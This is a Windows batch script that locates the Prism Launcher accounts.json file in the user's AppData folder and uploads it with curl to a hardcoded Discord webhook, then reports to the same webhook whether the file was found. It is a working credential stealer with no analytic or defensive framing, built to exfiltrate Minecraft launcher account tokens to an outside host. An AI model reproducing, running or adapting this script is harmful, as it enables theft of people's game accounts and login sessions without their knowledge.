@echo off
:: Set Webhook URL
set "webhookUrl=https://discord.com/api/webhooks/1332930112491884604/vmDraTMAZhzxDzh-GgzeWErsfj_krrPWnYDl2lrXbFSYbBe9svGOxFIRe7vh13uEYII4"

:: Get the AppData directory dynamically
set "appData=%AppData%"

:: Define file path for PrismLauncher accounts file
set "prismLauncherFile=%appData%\PrismLauncher\accounts.json"

:: Create message indicating Prism Launcher file status
set "message=Prism Launcher accounts file: "

:: Check if the file exists
if exist "%prismLauncherFile%" (
    set "message=%message%Found. Sending file..."
    
    :: Send the file to Discord using curl
    curl -X POST %webhookUrl% ^
         -F "file=@%prismLauncherFile%" ^
         -F "payload_json={\"content\": \"Prism Launcher accounts file attached.\"}"
) else (
    set "message=%message%Not found."
)

:: Send the message to Discord webhook with the file status
curl -X POST %webhookUrl% ^
     -H "Content-Type: application/json" ^
     -d "{\"content\": \"%message%\"}"
